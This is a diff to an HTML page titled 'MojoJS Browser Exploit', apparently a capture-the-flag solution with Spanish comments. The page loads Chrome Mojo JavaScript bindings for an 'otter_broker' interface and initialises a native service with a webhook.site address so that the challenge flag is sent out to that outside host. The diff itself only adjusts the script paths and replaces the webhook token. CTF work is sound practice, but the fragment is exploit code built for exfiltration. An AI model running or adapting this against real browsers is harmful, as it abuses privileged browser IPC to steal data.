@@ -3,8 +3,8 @@
 <head>
     <title>MojoJS Browser Exploit</title>
     <!-- 1. Cargamos las rutas de los scripts exactas que descubrimos en el reto -->
-    <script src="/mojojs/mojo_bindings.js"></script>
-    <script src="/mojojs/gen/third_party/blink/public/mojom/otter/otter_broker.mojom.js"></script>
+    <script src="mojojs/mojo_bindings.js"></script>
+    <script src="mojojs/gen/third_party/blink/public/mojom/otter/otter_broker.mojom.js"></script>
 </head>
 <body>
     <h1>Exfiltrando Bandera...</h1>
@@ -23,7 +23,7 @@
 
             // 3. Apuntamos el host hacia tu Webhook.site (sin http:// ni https:// porque C++ lo añade)
             // Reemplaza estrictamente con tu token limpio de Webhook.site
-            const miWebhook = "webhook.site/b7fc663e-4c60-46a9-8337-48061b032bc0";
+            const miWebhook = "webhook.site/2121bd6b-745c-4738-bc60-e70c3eb2480d";
             
             document.getElementById('status').innerText = "Conectando servicio nativo a tu Webhook...";
             await ptr.init(miWebhook);
